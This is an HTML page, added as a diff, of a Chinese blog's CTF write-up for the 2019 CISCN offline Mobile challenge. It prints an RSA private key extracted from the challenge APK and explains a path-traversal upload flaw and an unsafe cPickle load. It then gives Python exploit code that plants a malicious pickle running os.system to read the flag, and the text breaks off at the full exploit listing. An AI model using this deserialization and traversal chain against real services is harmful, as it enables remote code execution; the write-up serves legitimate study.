@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"samo.fun","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="比赛的时候对很多东西不熟悉，导致没做出来，赛后复现一下，理清楚流程后会做的很顺利">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019年全国大学生信息安全竞赛(华中赛区)线下赛Mobile">
+<meta property="og:url" content="http://samo.fun/2019/06/04/CISCN2019_OFFLINE/index.html">
+<meta property="og:site_name" content="SAMO">
+<meta property="og:description" content="比赛的时候对很多东西不熟悉，导致没做出来，赛后复现一下，理清楚流程后会做的很顺利">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170213.bmp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170237.bmp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170344.bmp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170406.bmp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170449.bmp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170510.bmp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170522.bmp">
+<meta property="og:updated_time" content="2020-03-25T09:06:35.381Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019年全国大学生信息安全竞赛(华中赛区)线下赛Mobile">
+<meta name="twitter:description" content="比赛的时候对很多东西不熟悉，导致没做出来，赛后复现一下，理清楚流程后会做的很顺利">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170213.bmp">
+
+<link rel="canonical" href="http://samo.fun/2019/06/04/CISCN2019_OFFLINE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2019年全国大学生信息安全竞赛(华中赛区)线下赛Mobile | SAMO</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SAMO</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://samo.fun/2019/06/04/CISCN2019_OFFLINE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325201538.jpg">
+      <meta itemprop="name" content="SAMO">
+      <meta itemprop="description" content="Have fun!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SAMO">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019年全国大学生信息安全竞赛(华中赛区)线下赛Mobile
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-06-04 01:27:39" itemprop="dateCreated datePublished" datetime="2019-06-04T01:27:39+08:00">2019-06-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-25 17:06:35" itemprop="dateModified" datetime="2020-03-25T17:06:35+08:00">2020-03-25</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>比赛的时候对很多东西不熟悉，导致没做出来，赛后复现一下，理清楚流程后会做的很顺利</p>
+<a id="more"></a>
+<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>下载的压缩包里有两个文件，一个是服务端index.py，一个是.apk文件，把apk拖入安卓模拟器安装运行一下，会要我们输入一个服务端的ip地址，我们运行下index.py就可以开启服务端了</p>
+<p>由于服务端和解题用的几个python库Kali都自带了，所以为了方便在Kali上写exp，只有以下几个工具是在Win10上运行的：</p>
+<p>相关工具：</p>
+<blockquote>
+<p>安卓模拟器(这里用的雷电模拟器)<br>dex2jar-2.0<br>jd-gui</p>
+</blockquote>
+<p>相关的ip地址：</p>
+<blockquote>
+<p>WIN10 : 192.168.41.1<br>Kali       : 192.168.41.8</p>
+</blockquote>
+<h1 id="0x01-APK分析"><a href="#0x01-APK分析" class="headerlink" title="0x01 APK分析"></a>0x01 APK分析</h1><p>服务端用的5000端口，开启服务端后，在运行的apk上输入 <em>192.168.41.8:5000</em> 后点set按钮，可以看到服务端有正确的响应</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170213.bmp" alt="-1.bmp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170237.bmp" alt="0.bmp"></p>
+<p>把apk后缀改成zip解压，有个classes.dex，用dex2jar把他转成jar</p>
+<blockquote>
+<p>d2j-dex2jar.bat classes.dex</p>
+</blockquote>
+<p>会报个错，不用理会，用jd-gui打开jar文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170344.bmp" alt="1.bmp"></p>
+<p>函数比较少，前面我们点set按钮后有个post请求，应该就是调用了<em>post</em>这个函数，再搜索一下哪个地方调用了<em>post</em>函数，可以找到<em>runnable</em>这里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170406.bmp" alt="2.bmp"></p>
+<p><em>post</em>接收两个参数，第一个是根据我们的输入拼接的url：<em><a href="http://192.168.41.8:5000/" target="_blank" rel="noopener">http://192.168.41.8:5000/</a></em>，第二个是一个<strong>将一个JSON对象转换成字符串后再用私钥加密的字符串</strong>，JSON对象里存了IMEI，手机型号等信息</p>
+<p>_private_encrypto_接收一个字符串参数，将其加密，私钥为<em>Integer.valueOf(1)</em></p>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170449.bmp" alt="3.bmp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/SAMOxtan/blog_images/20200325170510.bmp" alt="4.bmp"></p>
+<p>将密钥提取出来，补上BEGIN和END，把所有\n删掉再换行，存为<strong>key.pem</strong></p>
+<blockquote>
+<p>—–BEGIN RSA PRIVATE KEY—–<br>MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAKq1dQhWg9RwFXVa<br>XeDysYY28xgiaidB0wLVjxRLAjB/tjQZwE/+Hp8Ak8BL3/+phnPLxl8MofX57OJ8<br>UUJRMIJr/xpgWiazbbeiTLN5OVQhEdsiS2jUnFg5rNuwTr4qYT7ImKKPjzf1Ji4L<br>UqwtZPza4cQDcdq78NPNbiDjGG/NAgMBAAECgYBUdazusCdPbxke09QI3Oq6VeuW<br>cEiHHckx6Ml+p9Hwfu99/ZOpwDgUQSvZA3FTQ+PS3OpL0qs7USlDsXBe2F6gCZ/e<br>1BvkEPE/FymHbzbSpr8BwjEel/kup842z11SujNxHbeznrXKNfvDlqR5HM7CurYE<br>rBW0X8She8lNAqXBXQJBANj3pPvSHFQ4ugkWst6XCX/gd5vQuvPzeUwHpReSdRsm<br>A6Jmv8oP03MQzjvsyrMoPatMzhN5Qtfpw12Febfl1pcCQQDJa2RGtK2jCiKxzKcb<br>Up9pPiSxtsdavneKoCG/tndICyGfeT1NRGSQsJCHIhxdee4QQYWUrzhbFBLLZDq4<br>sj07AkEAykt0T7si4MAXbPv2AKZQnCN9QhGHDof3k5UZL/ZFK+/wuY4Vyl+hJosH<br>z0XD5PFjNoGhLvUEBu6VUnBuAbHRtwJBAKysnHLhQlqbvdKfmEMcOf2HgP25rH5m<br>+ySk00n/q5LfuBt3XM54653/QGgZHigk96qIAXTOIooyU0p6yry8UTECQQCy8tuf<br>lq8/8ISRdkHixENX+APeYr4hjmn5mUFJgB4qFUp1ReR0nA2oGf6IkzAWEwLvEchu<br>KMtF7eEv1kHS+3Wd<br>—–END RSA PRIVATE KEY—–</p>
+</blockquote>
+<h1 id="0x02-index-py分析"><a href="#0x02-index-py分析" class="headerlink" title="0x02 index.py分析"></a>0x02 index.py分析</h1><p>服务端是用flask框架写的，用的几个库：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> cPickle,json,re,M2Crypto</span><br></pre></td></tr></table></figure>
+<p><em>M2Crypto</em>是一个加密的库，Kali上自带了，要在WIN10下安装比较麻烦。<strong><em>cPickle</em></strong>可以对python对象<strong>序列化与反序列化</strong></p>
+<p>index.py代码的大致结构如下:</p>
+<blockquote>
+<p>├──Classes<br>|　 └── Phone<br>|　　 └── __init__(self, makers=’’, model=’’, language=’’, Android=’’, IMEI=’’)<br>├── Functions<br>　　├── public_decrypt(msg)<br>　　├── hello()<br>　　├── search()<br>　　├── upload()<br>　　└── check()</p>
+</blockquote>
+<p>完整代码看index.py，下面逐个分析上面这几个东西</p>
+<p>先看_public<em>decrypt</em>，获取一个msg，用公钥来解密它<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">public_decrypt</span><span class="params">(msg)</span>:</span></span><br><span class="line">	sign_pub=<span class="string">'''</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqtXUIVoPUcBV1Wl3g8rGGNvMY</span></span><br><span class="line"><span class="string">ImonQdMC1Y8USwIwf7Y0GcBP/h6fAJPAS9//qYZzy8ZfDKH1+ezifFFCUTCCa/8a</span></span><br><span class="line"><span class="string">YFoms223okyzeTlUIRHbIkto1JxYOazbsE6+KmE+yJiij4839SYuC1KsLWT82uHE</span></span><br><span class="line"><span class="string">A3Hau/DTzW4g4xhvzQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">	bio = M2Crypto.BIO.MemoryBuffer(sign_pub)</span><br><span class="line">	rsa_pub = M2Crypto.RSA.load_pub_key_bio(bio) </span><br><span class="line">	ctxt_pri = msg.decode(<span class="string">"base64"</span>)</span><br><span class="line">	output = rsa_pub.public_decrypt(ctxt_pri, M2Crypto.RSA.pkcs1_padding) <span class="comment">#公钥解密</span></span><br><span class="line">	<span class="keyword">return</span> output</span><br></pre></td></tr></table></figure></p>
+<p>一般来说都是公钥加密私钥解密，但这里是<strong>私钥加密公钥解密</strong></p>
+<p>定义了一个类，存了一些IMEI，手机品牌之类的东西</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Phone</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,makers=<span class="string">''</span>,model=<span class="string">''</span>,language=<span class="string">''</span>,Android=<span class="string">''</span>,IMEI=<span class="string">''</span>)</span>:</span></span><br><span class="line">		self.makers = makers</span><br><span class="line">		self.model = model </span><br><span class="line">		self.language = language </span><br><span class="line">		self.Android = Android </span><br><span class="line">		self.IMEI = IMEI</span><br></pre></td></tr></table></figure>
+<p>访问<em><a href="http://192.168.41.8:5000/" target="_blank" rel="noopener">http://192.168.41.8:5000/</a></em>的时候会执行 <em>hello</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/",methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data  = public_decrypt(request.data) <span class="comment">#解密</span></span><br><span class="line">		phone = json.loads(data) <span class="comment">#转字典</span></span><br><span class="line">		imei = phone[<span class="string">"IMEI"</span>]</span><br><span class="line">		<span class="keyword">if</span> re.match(<span class="string">"^\d&#123;15&#125;$"</span>,imei): <span class="comment">#用IMEI正则匹配是否是长度为15的纯数字字符串</span></span><br><span class="line">			file = open(<span class="string">"./phone/"</span>+imei,<span class="string">'wb'</span>)</span><br><span class="line">			newPhone = Phone(phone[<span class="string">"makers"</span>],phone[<span class="string">"model"</span>],phone[<span class="string">"language"</span>],phone[<span class="string">"Android"</span>],phone[<span class="string">"IMEI"</span>])</span><br><span class="line">			phonestring = cPickle.dump(newPhone,file) <span class="comment">#序列化保存到文件</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line">	<span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
+<p>获得从apk发送的 <em>request.data</em> 并解密，转成字典，用IMEI正则匹配是否是<strong>长度为15的纯数字字符串</strong>，是的话创建一个phone对象，将其序列化写入phone目录下，文件名是IMEI的值</p>
+<p>访问<em>192.168.41.8:5000/search</em>的时候会执行 <em>search</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/search",methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"xxxx"</span>+request.form.get(<span class="string">"imei"</span>)</span><br><span class="line">		imei = public_decrypt(request.form.get(<span class="string">"imei"</span>))</span><br><span class="line">		<span class="keyword">if</span> re.match(<span class="string">"^\d&#123;15&#125;$"</span>,imei): <span class="comment">#用IMEI正则匹配是否是长度为15的纯数字字符串</span></span><br><span class="line">			f = open(<span class="string">"./phone/"</span>+imei)</span><br><span class="line">			phone = cPickle.load(f)</span><br><span class="line">			<span class="keyword">return</span> phone.makers+<span class="string">'\n'</span>+phone.model+<span class="string">'\n'</span>+phone.language+<span class="string">'\n'</span>+phone.Android+<span class="string">'\n'</span>+phone.IMEI</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
+<p>从表单获取加密过的imei并解密，正则匹配，是15个数字的话加载相应的文件将其反序列化</p>
+<p>访问<em>192.168.41.8:5000/upload</em>的时候会执行 <em>upload</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/upload",methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		f = request.files[<span class="string">'myfile'</span>]</span><br><span class="line">		f.save(<span class="string">"./image/"</span>+f.filename)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
+<p>获取上传的文件保存到image目录下，注意到<strong>upload没有正则匹配</strong></p>
+<p>访问<em>192.168.41.8:5000/check</em>的时候会执行 <em>check</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/check",methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		name = request.form.get(<span class="string">'myfile'</span>)</span><br><span class="line">		<span class="keyword">if</span> re.match(<span class="string">"^\d&#123;15&#125;$"</span>,name):</span><br><span class="line">			f = open(<span class="string">"./image/"</span>+name,<span class="string">"rb"</span>)</span><br><span class="line">			<span class="keyword">return</span> f.read()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
+<p>从表单获取文件名，正则匹配，是15个数字的话在返回文件内容</p>
+<p>这几个函数都不复杂，由于 <em>upload</em> 获取文件名时没有正则匹配，可以输入带有 <strong>.</strong> 和 <strong>/</strong> 的文件名，意味着<strong>可以在任意路径下写</strong></p>
+<p>而<em>search</em>函数可以把phone目录下的文件反序列化，那么我们可以构造一个序列化文件，将其上传到phone目录下，再调用<em>search</em>就可以反序列化，执行我们的代码</p>
+<h1 id="0x03-构建exp"><a href="#0x03-构建exp" class="headerlink" title="0x03 构建exp"></a>0x03 构建exp</h1><p>流程： 创建序列化文件 –&gt; upload –&gt; search –&gt; 任意代码执行</p>
+<h4 id="创建序列化文件"><a href="#创建序列化文件" class="headerlink" title="创建序列化文件"></a>创建序列化文件</h4><p>构建一个类，添加一个 __reduce__() 魔术方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line">phone_name = <span class="string">'865166025111652'</span></span><br><span class="line">flag_name  = <span class="string">'111111111111111'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> (__import__(<span class="string">'os'</span>).system, (<span class="string">'cat flag &gt; ./image/'</span> + flag_name,))</span><br><span class="line"></span><br><span class="line">file = open(phone_name,<span class="string">'wb'</span>)</span><br><span class="line">a = A()</span><br><span class="line">cPickle.dump(a, file)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化，反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码，序列化文件名只要是15个数字即可</p>
+<p>这里为了方便，直接将读取的flag写入image文件夹下，最后可以用 <em>check</em> 函数读出来，也有其他方法获取flag</p>
+<h4 id="上传到服务端"><a href="#上传到服务端" class="headerlink" title="上传到服务端"></a>上传到服务端</h4><p>注意设置的文件名要在前面加 ../phone/，将其写入phone目录下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.41.8:5000/upload'</span></span><br><span class="line">    files = &#123;<span class="string">'myfile'</span>: (<span class="string">'../phone/'</span> + phone_name, open(phone_name, <span class="string">'rb'</span>))&#125;     </span><br><span class="line">    requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line">upload_file()</span><br></pre></td></tr></table></figure>
+<h4 id="加密文件名"><a href="#加密文件名" class="headerlink" title="加密文件名"></a>加密文件名</h4><p>由于<em>search</em> 接受的是一个经过私钥加密的字符串，所以我们要先将IMEI加密，再post</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> M2Crypto</span><br><span class="line"></span><br><span class="line"><span class="comment">#私钥加密，公钥解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">private_encrypt</span><span class="params">(msg, file_name)</span>:</span></span><br><span class="line">    rsa_pri = M2Crypto.RSA.load_key(file_name)</span><br><span class="line">    ctxt_pri = rsa_pri.private_encrypt(msg, M2Crypto.RSA.pkcs1_padding)</span><br><span class="line">    ctxt64_pri = ctxt_pri.encode(<span class="string">'base64'</span>)</span><br><span class="line">    <span class="keyword">print</span> (ctxt64_pri)</span><br><span class="line">    <span class="keyword">return</span> ctxt64_pri</span><br><span class="line"></span><br><span class="line">imei = private_encrypt(phone_name, <span class="string">'key.pem'</span>) <span class="comment">#key.pem是之前从apk中提取出来的私钥</span></span><br></pre></td></tr></table></figure>
+<p>这一步可以修改下index.py里的_public<em>decrypt</em>函数输出 msg 和解密后的 output，验证下这个函数加密出来的内容和apk加密的是否一致</p>
+<h4 id="反序列化-amp-输出flag"><a href="#反序列化-amp-输出flag" class="headerlink" title="反序列化 &amp; 输出flag"></a>反序列化 &amp; 输出flag</h4><p>触发search函数，反序列化执行代码，再用check函数读出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserialization</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.41.8:5000/search'</span></span><br><span class="line">    data = &#123;<span class="string">'imei'</span>:imei&#125;</span><br><span class="line">    requests.post(url, data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.41.8:5000/check'</span></span><br><span class="line">    data = &#123;<span class="string">'myfile'</span>:<span class="string">'865166025111652'</span>&#125;</span><br><span class="line">    r = requests.post(url, data)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">deserialization()</span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td 